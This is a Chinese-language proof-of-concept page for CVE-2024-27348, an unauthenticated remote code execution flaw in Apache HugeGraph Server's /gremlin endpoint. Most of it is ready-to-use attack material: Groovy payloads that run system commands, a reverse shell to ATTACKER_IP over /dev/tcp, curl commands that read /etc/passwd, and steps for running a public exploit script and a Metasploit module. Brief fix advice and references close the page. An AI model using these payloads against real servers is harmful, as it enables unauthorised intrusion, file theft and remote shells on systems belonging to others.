# Apache HugeGraph Gremlin RCE 漏洞 POC

## 系统简介

Apache HugeGraph Server 是一款开源的图数据库服务器，支持 Gremlin 图遍历语言进行查询和计算。

---

## CVE-2024-27348 — Gremlin API 未认证远程代码执行（CVSS 9.8）

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2024-27348 |
| CVSS | 9.8 (CRITICAL) |
| 漏洞类型 | 远程代码执行（RCE） |
| 认证要求 | 无需认证 |
| 影响版本 | Apache HugeGraph Server 1.0.0 — 1.2.0 |
| 修复版本 | 1.3.0 |

### 漏洞原理

HugeGraph Server 的 Gremlin API 端点接受用户提交的 Gremlin-Groovy 查询，但未实施适当的认证控制和沙箱限制。攻击者可提交包含任意 Java/Groovy 代码的 Gremlin 查询，通过 `ProcessBuilder` 或反射机制执行系统命令。

### 漏洞端点

```
POST /gremlin
```

### POC — 命令执行（whoami）

```http
POST /gremlin HTTP/1.1
Host: target:8080
Content-Type: application/json

{
  "gremlin": "Thread.currentThread().getContextClassLoader().loadClass('java.lang.Runtime').getMethod('exec', String.class).invoke(Thread.currentThread().getContextClassLoader().loadClass('java.lang.Runtime').getMethod('getRuntime').invoke(null), 'id')",
  "bindings": {},
  "language": "gremlin-groovy",
  "aliases": {}
}
```

### POC — 反弹 Shell（Groovy ProcessBuilder）

```http
POST /gremlin HTTP/1.1
Host: target:8080
Content-Type: application/json

{
  "gremlin": "def pb = new ProcessBuilder(['bash', '-i', '>&', '/dev/tcp/ATTACKER_IP/4444', '0>&1']); pb.redirectErrorStream(true); def p = pb.start(); p.waitFor()",
  "bindings": {},
  "language": "gremlin-groovy",
  "aliases": {}
}
```

### POC — 使用 curl 利用

```bash
# 读取 /etc/passwd
curl -X POST http://target:8080/gremlin \
  -H 'Content-Type: application/json' \
  -d '{
    "gremlin": "def cmd = [\"cat\", \"/etc/passwd\"]; def pb = new ProcessBuilder(cmd); pb.redirectErrorStream(true); def p = pb.start(); p.text",
    "bindings": {},
    "language": "gremlin-groovy",
    "aliases": {}
  }'

# 执行命令并获取输出
curl -X POST http://target:8080/gremlin \
  -H 'Content-Type: application/json' \
  -d '{
    "gremlin": "\"id\".execute().text",
    "bindings": {},
    "language": "gremlin-groovy",
    "aliases": {}
  }'
```

### 使用公开 POC 脚本

```bash
# 从 GitHub 获取 POC
git clone https://github.com/jakabakos/CVE-2024-27348-Apache-HugeGraph-RCE

# 执行利用（建立反弹 shell）
python3 exploit.py -t http://target:8080 -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"

# 或使用 Metasploit 模块
use exploit/linux/http/apache_hugegraph_gremlin_rce
set RHOSTS target
set RPORT 8080
run
```

### 利用步骤

1. 确认目标运行 HugeGraph 1.0.0–1.2.0
2. 直接向 `/gremlin` 端点发送 POST 请求
3. 在 `gremlin` 字段中注入 Groovy 代码
4. 执行任意系统命令或建立反弹 shell

### 修复建议

- 升级至 HugeGraph Server 1.3.0
- 在 Java 11 环境下运行（安全管理器更严格）
- 启用认证并限制 Gremlin 端点的 IP 访问白名单

### 参考资料

- [GitHub jakabakos POC](https://github.com/jakabakos/CVE-2024-27348-Apache-HugeGraph-RCE)
- [Rapid7 Metasploit 模块](https://www.rapid7.com/db/modules/exploit/linux/http/apache_hugegraph_gremlin_rce/)
- [Exploit-DB #52149](https://www.exploit-db.com/exploits/52149)
- [NICCS CISA 培训](https://niccs.cisa.gov/training/catalog/cybrary/cve-series-apache-hugegraph-server-gremlin-query-language-rce-cve-2024-27348)
- [AttackerKB](https://attackerkb.com/topics/nwymrRTawo/cve-2024-27348)
- [SecureLayer7 分析](https://blog.securelayer7.net/remote-code-execution-in-apache-hugegraph/)
